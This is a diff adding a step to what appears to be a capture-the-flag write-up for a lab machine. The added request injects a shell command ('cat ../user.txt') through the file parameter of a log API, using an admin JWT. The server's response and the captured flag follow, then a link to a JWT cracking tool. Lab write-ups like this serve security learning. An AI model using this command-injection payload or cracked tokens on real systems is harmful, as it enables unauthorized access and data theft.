@@ -189,7 +189,33 @@ Connection: close
 
 6. 
 ````
+GET /api/logs?file=index.js;cat+../user.txt HTTP/1.1
+Host: 10.10.11.120
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
+Connection: close
+Content-Type: application/json
+Content-Length: 0
+auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWQ5MDAwNTY2YTdlNTA0NjhhNGFlNGIiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InJvb3RAZGFzaXRoLndvcmtzIiwiaWF0IjoxNjQxNjExMjc4fQ.-GiEdOB97BN4toK2PGGvjE-5UocBCV_dzj5vSRGRDLk
 
+
+````
+
+````
+HTTP/1.1 200 OK
+X-Powered-By: Express
+Content-Type: application/json; charset=utf-8
+Content-Length: 61
+ETag: W/"3d-u+mlmerZw4DaBZWdXoErNJODbYk"
+Date: Sat, 08 Jan 2022 04:06:44 GMT
+Connection: close
+
+"ab3e953 Added the codes\nddcf7f061fa3c3c2c6756391e57676d3\n"
+````
+
+user.txt => ddcf7f061fa3c3c2c6756391e57676d3
 
 Tool to crack JWT:
 https://lmammino.github.io/jwt-cracker/
